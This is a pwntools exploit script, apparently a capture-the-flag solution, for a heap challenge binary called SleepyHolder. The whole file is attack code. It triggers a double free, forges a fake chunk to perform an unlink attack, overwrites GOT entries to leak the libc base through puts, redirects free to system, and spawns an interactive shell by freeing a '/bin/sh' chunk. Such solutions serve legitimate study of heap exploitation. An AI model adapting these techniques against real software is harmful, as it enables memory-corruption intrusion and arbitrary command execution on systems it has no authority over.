#!/usr/bin/env python
from pwn import *

r = process('./SleepyHolder')
elf = ELF('./SleepyHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
	
def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

add(1, 'a')
add(2, 'a')
de(1)
add(3, 'a')
#gdb.attach(r)
de(1)                #double free

#-----------------unlink--------------------------

f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += '\x20'
add(1, fake_chunk)
de(2)

#-------------------------------------------------
#atoi_GOT = 0x602080
#free_GOT = 0x602018
#puts_GOT = 0x602020
#puts_plt = 0x400760

atoi_offset = libc.symbols['atoi']#0x037160
system_offset = libc.symbols['system']#0x435d0

f = p64(0)
f += p64(elf.got['atoi']) + p64(elf.got['puts']) + p64(elf.got['free'])
f += p32(1)*3
update(1, f)
#gdb.attach(r)
update(1, p64(elf.plt['puts']))

de(2)
s = r.recv(6)

libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
system = libc_base + system_offset
log.info("system_address: "+hex(system))

update(1, p64(system))
add(2, '/bin/sh\0')
de(2)


r.interactive()

